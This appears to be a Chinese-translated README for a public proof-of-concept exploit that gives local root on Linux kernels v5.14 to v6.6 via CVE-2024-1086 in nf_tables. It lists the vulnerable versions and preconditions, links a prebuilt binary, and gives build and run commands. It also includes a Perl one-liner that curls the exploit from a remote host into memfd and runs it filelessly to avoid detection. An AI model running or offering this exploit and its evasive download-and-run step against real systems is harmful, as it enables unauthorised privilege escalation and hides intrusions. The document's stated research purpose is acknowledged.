# CVE-2024-1086
· [English README.md](https://github.com/3049298988/CVE-2024-1086)

针对 CVE-2024-1086 的通用本地权限提升概念验证漏洞，适用于 v5.14 和 v6.6 之间的大多数 Linux 内核，包括 Debian、Ubuntu 和 KernelCTF。KernelCTF 映像的成功率为 99.4%。

https://github.com/Notselwyn/CVE-2024-1086/assets/68616630/a3d43951-94ab-4c09-a14b-07b81f89b3de

## 博客 /文章

有关该漏洞的完整描述（包括背景信息和大量有用的图表），可以在[Flipping Pages 博客文章](https://pwning.tech/nftables/). 中找到。


## 受影响的内核版本

该漏洞影响从（包括）v5.14 到 v6.6 的内核版本，不包括已修补的分支 v5.15.149>、v6.1.76>、v6.6.15>。这些版本的补丁于 2024 年 2 月发布。该基础漏洞影响从 v3.15 到 v6.8-rc1 的所有版本（不包括已修补的稳定分支）。

**警告：**
- 该漏洞利用不适用于 `kconfig CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` 的 v6.4> 内核（包括 Ubuntu v6.5）
这些漏洞需要用户命名空间 （`kconfig CONFIG_USER_NS=y` ），这些用户命名空间是非特权的 （sh command `sysctl kernel.unprivileged_userns_clone` = 1），并且nf_tables已启用 （kconfig `CONFIG_NF_TABLES=y` ）。默认情况下，这些都在 Debian、Ubuntu 和 KernelCTF 上启用。其他发行版尚未经过测试，但也可能正常工作。
- 该漏洞在具有大量网络活动的系统上可能不稳定
  - 带有WiFi适配器的系统，当被高使用率的WiFi网络包围时，会非常不稳定。
  - 在测试设备上，请通过BIOS关闭WiFi适配器。

## 用法

### 配置

默认值应该在带有本地 shell 的 Debian、Ubuntu 和 KernelCTF 上开箱即用。在未经测试的安装/发行版上，请确保 kconfig 值与目标内核匹配。这些可以在 中指定 [`src/config.h`](/src/config.h). 。如果在物理内存超过 32GiB 的计算机上运行此漏洞，请确保增加 `CONFIG_PHYS_MEM` .

如果通过 SSH（进入测试计算机）或反向 shell 运行漏洞，则可能需要切换 `CONFIG_REDIRECT_LOG` 到 1 以避免不必要的网络活动。

### 构建

如果这对您来说不切实际，则可以使用默认配置进行 [x64 二进制文件编译](https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit) 

```bash
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
```

二进制文件: `CVE-2024-1086/exploit`


### 运行

运行漏洞同样简单：

```bash
./exploit
```

还支持无文件执行，以防需要避免检测的渗透测试情况。但是，Perl 需要安装在目标上：
```bash
perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  system "curl https://example.com/exploit -s >&$fd";
  exec {"/proc/$$/fd/$fd"} "memfd";
'
```

## 免责声明

本软件目录/文件夹/存储库（"储存库"）中的程序和脚本（"程序"）仅出于教育/研究目的而发布、开发和分发。我（"创建者"）不容忍任何恶意或非法使用此存储库中的程序，因为其目的是共享研究而不是对其进行非法活动。对于您对此存储库中的程序所做的任何事情，我不承担任何法律责任。
